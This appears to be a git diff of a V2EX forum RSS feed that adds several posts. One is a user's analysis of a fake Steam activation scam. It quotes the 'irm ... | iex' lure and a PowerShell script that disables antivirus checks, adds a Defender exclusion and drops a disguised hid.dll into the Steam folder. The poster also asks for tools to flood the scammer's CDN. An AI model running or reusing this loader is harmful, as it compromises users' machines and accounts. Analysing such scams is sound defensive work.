@@ -5,15 +5,210 @@
 <link>https://www.v2ex.com/</link>
 
 <item>
+<title>[宽带症候群] 垃圾 114dns 用不了一点</title>
+<link>https://www.v2ex.com/t/1015790</link>
+<guid>https://www.v2ex.com/t/1015790</guid>
+<content:encoded><![CDATA[
+
+小米还给他硬编码到系统里面去了<br /><a href="https://i.imgur.com/qtoEiLi.jpeg" rel="nofollow noopener" target="_blank"><img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/qtoEiLi.jpeg" /></a>
+]]></content:encoded>
+<pubDate>2024-02-15T18:04:17Z</pubDate>
+<pubDate>2024-02-15T18:01:17Z</pubDate>
+</item>
+<item>
+<title>[问与答] 请教一个在 nodejs 下模拟终端环境运行一些仅在终端下运行的指令问题</title>
+<link>https://www.v2ex.com/t/1015789</link>
+<guid>https://www.v2ex.com/t/1015789</guid>
+<content:encoded><![CDATA[
+
+<p>各位大佬，请教一个问题，我想在 nodejs 环境下运行 nvm for windows 的指令，但是在 nvm 最近更新的版本里，发现新增了终端检测代码：</p>
+<pre><code>if !isTerminal() {
+		alert("NVM for Windows should be run from a terminal such as CMD or PowerShell.", "Terminal Only")
+		os.Exit(0)
+	}
+
+	// Capture any additional arguments
+	if len(args) &gt; 2 {
+		detail = args[2]
+@@ -180,6 +185,102 @@ func setNpmMirror(uri string) {
+	saveSettings()
+}
+
+func isTerminal() bool {
+	fileInfo, err := os.Stdout.Stat()
+	if err != nil {
+		return false
+	}
+	return (fileInfo.Mode() &amp; os.ModeCharDevice) != 0
+}
+</code></pre>
+<p>请问我可以绕开这个检测吗</p>
+]]></content:encoded>
+<pubDate>2024-02-15T17:22:06Z</pubDate>
+<pubDate>2024-02-15T17:31:12Z</pubDate>
+</item>
+<item>
+<title>[Steam] steam 假激活的玩意分析</title>
+<link>https://www.v2ex.com/t/1015787</link>
+<guid>https://www.v2ex.com/t/1015787</guid>
+<content:encoded><![CDATA[
+
+<p>pdd 店家假激活要求输入这个命令</p>
+<pre><code>irm steam.*** | iex 
+</code></pre>
+<p>尝试浏览器直接访问这个 steam 网站，直接跳转到了真 steam 思路错误 然后把管道符号|去掉 发现拉去的还是 html ，发现有些不对，于是把</p>
+<pre><code>irm steam.*** 
+</code></pre>
+<p>的玩意全部一股脑扔进 vscode 然后折叠 html 发现了这个玩意</p>
+<pre><code>
+#&gt;
+
+irm steam.***/pwsDwFile/new -OutFile x.ps1
+
+powershell.exe -ExecutionPolicy Bypass -File x.ps1;
+
+&lt;#
+</code></pre>
+<p>使用 powershell 绕过执行策略的限制
+这里我最开始没发现问题，看了半天 html 都快傻眼了，代码还能混淆进 html ？最后反向思考肯定得用 powershell 才能执行接下来的脚本，于是搜搜 powershell 关键字给我找出来上面那两玩意，前面那句居然是藏在 html 里面的，后面那句没有隐藏，vscode 折叠一下就看见 powershell 了
+继续跟进 x.ps1</p>
+<pre><code>cls
+
+$filePathToDelete = Join-Path $env:USERPROFILE "x.ps1"
+ if (Test-Path $filePathToDelete) {
+    Remove-Item -Path $filePathToDelete
+}
+$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "x.ps1"
+if (Test-Path $desktopFilePathToDelete) {
+    Remove-Item -Path $desktopFilePathToDelete
+}
+</code></pre>
+<p>把自己删了</p>
+<pre><code>$steamRegPath = 'HKCU:\Software\Valve\Steam'
+</code></pre>
+<p>搜搜 steam</p>
+<pre><code>$localPath = -join ($env:LOCALAPPDATA,"\SteamActive")
+if ((Test-Path $steamRegPath)) {
+    $properties = Get-ItemProperty -Path $steamRegPath
+    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
+        $steamPath = $properties.SteamPath
+    }
+}
+</code></pre>
+<p>让用户关掉授权</p>
+<pre><code>if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "[请重新打开 Power shell 打开方式以管理员身份运行]" -ForegroundColor:red
+    exit
+}
+
+function PwStart() {
+    if(Get-Process "360Tray*" -ErrorAction Stop){
+        while(Get-Process 360Tray* -ErrorAction Stop){
+            Write-Host "[请先退出 360 安全卫士]" -ForegroundColor:Red
+            Start-Sleep 1.5
+        }
+        PwStart
+
+    }
+    if(Get-Process "360sd*" -ErrorAction Stop)
+    {
+        while(Get-Process 360sd* -ErrorAction Stop){
+            Write-Host "[请先退出 360 杀毒]" -ForegroundColor:Red
+            Start-Sleep 1.5
+        }
+        PwStart
+    }
+</code></pre>
+<p>这句话很奇怪，实际上虚拟机里面没有 steam 并没有执行？</p>
+<pre><code>    if ($steamPath -eq ""){
+        Write-Host "[请检查您的 Steam 是否正确安装]" -ForegroundColor:Red
+        exit
+    }
+</code></pre>
+<p>关掉 steam</p>
+<pre><code>    Write-Host "[ServerStart        OK]" -ForegroundColor:green
+    Stop-Process -Name steam* -Force -ErrorAction Stop
+    Start-Sleep 2
+    if(Get-Process steam* -ErrorAction Stop){
+        TASKKILL /F /IM "steam.exe" | Out-Null
+        Start-Sleep 2
+    }
+
+    if (!(Test-Path $localPath)) {
+        md $localPath | Out-Null
+        if (!(Test-Path $localPath)) {
+            New-Item $localPath -ItemType directory -Force | Out-Null
+        }
+    }
+
+    $catchPath = -join ($steamPath,"\package\data")
+    if ((Test-Path $catchPath)) {
+        if ((Test-Path $catchPath)) {
+            Remove-Item $catchPath -Recurse -Force | Out-Null
+        }
+    }
+</code></pre>
+<p>添加免杀</p>
+<pre><code>    try{
+        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
+        Start-Sleep 3
+    }catch{}
+
+    Write-Host "[Result-&gt;0          OK]" -ForegroundColor:green
+</code></pre>
+<p>删掉其他家的 dll ？</p>
+<pre><code>    try{
+        $d = $steamPath + "/version.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/user32.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/hid.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+    }catch{
+        Write-Host "[异常残留请检查[$d]文件是否异常!]" -ForegroundColor:red
+        exit
+    }
+</code></pre>
+<p>下 pdf 假装？话说老哥们有啥可以刷网络的工具么，其实我有点想刷上一波把他 cdn 刷干净，但是限速 2m 并且单 ip 限 1 个线程</p>
+<pre><code>    $downloadData = "http://steam.***/pwsDwFile/bcfc1e52ca77ad82122dfe4c9560f3ec.pdf"
+    $downloadLink = "http://steam.***/pwsDwFile/9b96dab2bb0ba18d56068fabc5b17185.pdf"
+    
+    irm -Uri $downloadLink -OutFile $d -ErrorAction Stop
+    Write-Host "[Result-&gt;1          OK]" -ForegroundColor:green
+    $d = $localPath + "/hid"
+    irm -Uri $downloadData -OutFile $d -ErrorAction Stop
+    Write-Host "[Result-&gt;2          OK]" -ForegroundColor:green
+    
+    Start-Sleep 1
+</code></pre>
+<p>重新打开 steam</p>
+<pre><code>    Start steam://
+    Write-Host "[连接服务器成功请在 Steam 输入激活码 3 秒后自动关闭]" -ForegroundColor:green
+    Start-Sleep 3
+    exit
+|
+}
+</code></pre>
+<p>整体看下来就是给 steam 添加了两个文件，可是看起来并没有进行注入什么的啊，我理解就需要 dll 时候是先拉文件目录内的 dll 进行执行？这样才能解释为啥就是只添加了两个文件？</p>
+]]></content:encoded>
+<pubDate>2024-02-15T16:54:12Z</pubDate>
+<pubDate>2024-02-15T17:13:21Z</pubDate>
+</item>
+
+<item>
 <title>[奇思妙想] 在中国实现婚前协议分配共有财产和婚后收入可行吗</title>
 <link>https://www.v2ex.com/t/1015786</link>
 <guid>https://www.v2ex.com/t/1015786</guid>
 <content:encoded><![CDATA[
-
 <p>婚前协议在中国有效吗，有替代方案吗？</p>
 <p>比如房产权利按比例，每年转移一部分；婚后收入只有固定比例作为共有收入。。。</p>
 ]]></content:encoded>
-<pubDate>2024-02-15T16:16:33Z</pubDate>
 <pubDate>2024-02-15T16:21:27Z</pubDate>
 </item>
 <item>
@@ -21,10 +216,8 @@
 <link>https://www.v2ex.com/t/1015785</link>
 <guid>https://www.v2ex.com/t/1015785</guid>
 <content:encoded><![CDATA[
-
 <p>偷窥了一下隔壁组的代码，nextjs13 版本，还上了 app router ，然后再往下看每一个 page.tsx 最上边都是一行“use client”。。。</p>
 ]]></content:encoded>
-<pubDate>2024-02-15T16:10:10Z</pubDate>
 <pubDate>2024-02-15T16:08:10Z</pubDate>
 </item>
 <item>
@@ -32,7 +225,6 @@
 <link>https://www.v2ex.com/t/1015784</link>
 <guid>https://www.v2ex.com/t/1015784</guid>
 <content:encoded><![CDATA[
-
 <p>父母去年都满 60 周岁了.<br />
 一直买的支付宝的好医保, 6 年续费版本的.<br />
 这个月续费, 每个月付款从 134.2 涨到 213.04 了.
@@ -40,7 +232,6 @@
 没想到一下子翻倍了.<br />
 有点不知所谓, 是所有百万医疗都会这样么?</p>
 ]]></content:encoded>
-<pubDate>2024-02-15T16:08:46Z</pubDate>
 <pubDate>2024-02-15T16:21:11Z</pubDate>
 </item>
 <item>
@@ -48,10 +239,8 @@
 <link>https://www.v2ex.com/t/1015782</link>
 <guid>https://www.v2ex.com/t/1015782</guid>
 <content:encoded><![CDATA[
-
 Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝买的需要中转的 API ，有没有开源项目可以让其转成原生的 API ，并且可以直接填入 readwise reader 里面？
 ]]></content:encoded>
-<pubDate>2024-02-15T15:13:18Z</pubDate>
 <pubDate>2024-02-15T15:16:36Z</pubDate>
 </item>
 <item>
@@ -59,11 +248,9 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <link>https://www.v2ex.com/t/1015781</link>
 <guid>https://www.v2ex.com/t/1015781</guid>
 <content:encoded><![CDATA[
-
 <p><a href="https://img2.imgtp.com/2024/02/15/qYcTdLIp.PNG" rel="nofollow">https://img2.imgtp.com/2024/02/15/qYcTdLIp.PNG</a>
 咋延迟这么高</p>
 ]]></content:encoded>
-<pubDate>2024-02-15T15:03:05Z</pubDate>
 <pubDate>2024-02-15T15:02:05Z</pubDate>
 </item>
 <item>
@@ -71,7 +258,6 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <link>https://www.v2ex.com/t/1015780</link>
 <guid>https://www.v2ex.com/t/1015780</guid>
 <content:encoded><![CDATA[
-
 <p>过年第一次去女朋友家，安徽阜阳这边，女朋友她妈直接当着她们一家人问打算给多少彩礼，说几年前大女儿当时给了 12w...</p>
 <p>一下子尬在饭桌上，想这好几年了意思是要涨一点？ 14w 不好听吧，就说了 16w.</p>
 <p>吃完饭有点无语，问了女朋友说她姐当时是给了这么多，而且基本是有来无回，只有象征性的嫁妆作为回礼(一般一床一千多的被子)</p>
@@ -79,7 +265,6 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <p>彩礼这东西，是给女方家长的，还是给女方的？想不明白为什么有这东西的存在。过去是嫁出去的女儿远离父母，但现在都在大城市打工，离她家还近一点，每年回去的次数也多。这和卖女儿有什么区别</p>
 <p>和同事讨论，他说他们那地方彩礼只是走个过场，给多少，女方还会加一些还回来，那这种情况彩礼高低还有啥现实讨论意义。</p>
 ]]></content:encoded>
-<pubDate>2024-02-15T14:44:35Z</pubDate>
 <pubDate>2024-02-15T16:15:16Z</pubDate>
 </item>
 <item>
@@ -87,7 +272,6 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <link>https://www.v2ex.com/t/1015779</link>
 <guid>https://www.v2ex.com/t/1015779</guid>
 <content:encoded><![CDATA[
-
 <h4>新加坡电商平台项目，诚招中、高级 java 后端开发 1~2 名。</h4>
 <h4>一、岗位职责</h4>
 <p>• 理解业务需求，根据需求文档进行数据表设计，业务逻辑开发；</p>
@@ -113,7 +297,6 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <p>• wx: g-o-n-g-x-l-e-i</p>
 <p>• 投递邮箱：<a href="mailto:s-c-c-r-i-t@163.com">s-c-c-r-i-t@163.com</a></p>
 ]]></content:encoded>
-<pubDate>2024-02-15T14:25:13Z</pubDate>
 <pubDate>2024-02-15T10:25:13Z</pubDate>
 </item>
 <item>
@@ -121,7 +304,6 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <link>https://www.v2ex.com/t/1015778</link>
 <guid>https://www.v2ex.com/t/1015778</guid>
 <content:encoded><![CDATA[
-
 <p>无意中踩了个坑，而且还很抽象。</p>
 <p>win11 （ win10 及以前的不知道）设置里有个选项<strong>“使用我的登录信息在更新后自动完成设置”</strong>，在<strong>账户&gt;登录选项</strong>里，开启后可以实现开机系统自动登录上次的账户，完成所有程序的开机自启，再自动锁定。而且并不需要等程序启动完成再锁定，是异步的，所有开机后往往会看见登录屏幕闪一下，那就是自动登录又马上锁定，程序就在后台慢慢自启。</p>
 <p>windows 的自启有很多实现方式，服务、计划任务、组策略、注册表、启动文件夹，等等，不同的程序往往可能选用不同的方式，所以在任务管理器的启动栏和设置的自启应用里面看到的不一定是全部，管家类程序能检测到的会更全一些，但也不一定是全部。</p>
@@ -132,7 +314,6 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <p>解决方法也很简单，把勾选的勾掉，再去设置里面确认，果然隐私诊断数据和登录自启都恢复了。</p>
 <p>所以说，真的是能用就别乱改，不懂原理和细节就别乱玩，当时候坑的还是自己。windows 表面上的同一个功能可能会有复数个设置对应，它们之间可能是“与”的关系，也可能是“或”的关系，还可能有不同的优先级。win10 和 win11 的新版设置，老版的控制面板，注册表，组策略管理器，最喜闻乐见的当然是改一处其他地方一起变，但很多时候某个设置是某个地方独占的或者独立的，这种情况就需要仔细斟酌了。</p>
 ]]></content:encoded>
-<pubDate>2024-02-15T14:24:10Z</pubDate>
 <pubDate>2024-02-15T14:21:10Z</pubDate>
 </item>
 <item>
@@ -140,7 +321,6 @@ Readwise Reader 中 Integretions 仅支持 openai 的原生 API ，对于淘宝�
 <link>https://www.v2ex.com/t/1014608</link>
 <guid>https://www.v2ex.com/t/1014608</guid>
 <content:encoded><![CDATA[
-
 <p>我们, <a href="https://jellyfish-g.co.jp" rel="nofollow">日本水母</a>专注于引荐在 IT 工程师等领域拥有卓越技术专长的人才，包括机械、电气电子、嵌入式控制、机器人技术等专业领域, 支持想在日本找工作，发展的你。</p>
 <p>如果您拥有以下的经验，技术，正在考虑来日本落地生根的话，不用犹豫，请留言，或参加我们的 LINE 团:</p>
 <ul>
@@ -172,10 +352,8 @@ TensorFlow, PyTorch, scikit-learn</p>
 <h3>工作所在地: 日本</h3>
 <p>有意者私聊：<a href="https://form.run/@jellyfish-g-SCPO0TaSGSFMMHJToFD4" rel="nofollow">https://form.run/@jellyfish-g-SCPO0TaSGSFMMHJToFD4</a></p>
 ]]></content:encoded>
-<pubDate>2024-02-06T04:06:14Z</pubDate>
 <pubDate>2024-02-11T08:18:23Z</pubDate>
 </item>
-
 <item>
 <title>[优惠信息] 公益 GPT4</title>
 <link>https://www.v2ex.com/t/1015777</link>
@@ -15201,100 +15379,6 @@ git add .
 回了好几滴血，还在 35%的深坑中，是逃还是再坚守？
 ]]></content:encoded>
 <pubDate>2024-02-06T06:01:33Z</pubDate>
-</item>
-<item>
-<title>[分享发现] 丁胖子金牌讲师</title>
-<link>https://www.v2ex.com/t/1014621</link>
-<guid>https://www.v2ex.com/t/1014621</guid>
-<content:encoded><![CDATA[
-<p>看了油管讲师的视频，靠着三句万能英语在美国流浪，感觉这哥们比社牛还牛</p>
-]]></content:encoded>
-<pubDate>2024-02-06T02:06:14Z</pubDate>
-</item>
-<item>
-<title>[问与答] 关于 Obsidian 图床私密设置问题</title>
-<link>https://www.v2ex.com/t/1014619</link>
-<guid>https://www.v2ex.com/t/1014619</guid>
-<content:encoded><![CDATA[
-<p>各位大佬好。</p>
-<p>我最近在用 obsidian 搭配 Cloudflare R2 自建图床。</p>
-<p>我这里的问题是，有时候笔记的截图比如一些凭证会比较私密。有没有什么办法限制笔记或应用加载图片进行鉴权呢？</p>
-<p>我试过给存储桶绑定自定义域名，然后通过 Cloudflare ZeroTrust 进行鉴权（比如策略选择 gmail 发送 code ），但这导致一个问题就是。这种 Markdown 里插入的图片链接，没有时机和交互启动鉴权流程。图片直接都不显示了。</p>
-<p>回到我的问题。就是这种自建的图床（放在外网云存储上而不是家里），怎么做鉴权呢？</p>
-]]></content:encoded>
-<pubDate>2024-02-06T05:50:16Z</pubDate>
-</item>
-<item>
-<title>[Android] 有用 iqoo neo9 的吗</title>
-<link>https://www.v2ex.com/t/1014618</link>
-<guid>https://www.v2ex.com/t/1014618</guid>
-<content:encoded><![CDATA[
-信号如何最近打算入手
-]]></content:encoded>
-<pubDate>2024-02-06T05:14:04Z</pubDate>
-</item>
-<item>
-<title>[问与答] 请教下海外 v2er 们，普通的办公电脑都怎么选的呢</title>
-<link>https://www.v2ex.com/t/1014617</link>
-<guid>https://www.v2ex.com/t/1014617</guid>
-<content:encoded><![CDATA[
-<p>普通办公的话，i5 ，16g ，512ssd 足够使用了。
-国内的话 thinkbook 和联想 x3-14 ，x5-14 等都可以在 4000-5000 搞定，都有不错的性价比</p>
-<p>不知道海外如何选择呢</p>
-]]></content:encoded>
-<pubDate>2024-02-06T04:49:04Z</pubDate>
-</item>
-<item>
-<title>[问与答] 不是， vision pro 要扫码登录的话咋整？兄弟们</title>
-<link>https://www.v2ex.com/t/1014616</link>
-<guid>https://www.v2ex.com/t/1014616</guid>
-<content:encoded><![CDATA[
-
-]]></content:encoded>
-<pubDate>2024-02-06T06:11:30Z</pubDate>
-</item>
-<item>
-<title>[小米] miui eea 如何升级 hyperos</title>
-<link>https://www.v2ex.com/t/1014615</link>
-<guid>https://www.v2ex.com/t/1014615</guid>
-<content:encoded><![CDATA[
-<p>之前给 note 12 turbo 刷了 miui eea ，想升级到 hyper os eea ，点击检查更新始终没有新系统提示，是需要重新下载个 hyper os eea 然后刷机吗，有没有能平滑升级的办法，重装一堆软件太麻烦了。</p>
-]]></content:encoded>
-<pubDate>2024-02-06T06:07:42Z</pubDate>
-</item>
-<item>
-<title>[云修电脑] 台式机启动时显示器花屏问题求助</title>
-<link>https://www.v2ex.com/t/1014614</link>
-<guid>https://www.v2ex.com/t/1014614</guid>
-<content:encoded><![CDATA[
-<ul>
-<li>2020 年初购置的飞利浦 27 寸曲面显示器（猛腾 275M7C ）</li>
-<li>平时偶尔打打游戏，大部分时间闲置</li>
-<li>最近出现开机就花屏，10 ～ 30 分钟能恢复正常</li>
-<li>接其它设备：笔记本、Switch 之类的没有花屏现象出现</li>
-<li>台式主机接其它显示器也正常，没有问题</li>
-</ul>
-]]></content:encoded>
-<pubDate>2024-02-06T04:36:42Z</pubDate>
-</item>
-<item>
-<title>[问与答] 立案之后，要终止调查，我可以继续打电话吗？</title>
-<link>https://www.v2ex.com/t/1014613</link>
-<guid>https://www.v2ex.com/t/1014613</guid>
-<content:encoded><![CDATA[
-<p><a href="https://www.v2ex.com/t/1004569" rel="nofollow">https://www.v2ex.com/t/1004569</a> 这个是之前的帖子，邻居在小区生产加工</p>
-<p>半个月之前打过 110 ，做了半小时的笔录，还送去一些材料，邻居停机 2 周，最近 2 天又开始生产，我想着年后再联系他们，打电话通知我，要终止调查，他问了邻居和其他部门，说反应没问题，但又拒绝回答我的细节，只是说了这事儿不归他们管。</p>
-]]></content:encoded>
-<pubDate>2024-02-06T06:10:35Z</pubDate>
-</item>
-<item>
-<title>[宽带症候群] 江苏南京 宽带是选联通好还是电信？</title>
-<link>https://www.v2ex.com/t/1014612</link>
-<guid>https://www.v2ex.com/t/1014612</guid>
-<content:encoded><![CDATA[
-平常就游戏需求 公网 IP 有没有倒是都还好
-]]></content:encoded>
-<pubDate>2024-02-06T06:19:55Z</pubDate>
 </item>
 </channel>
 </rss>
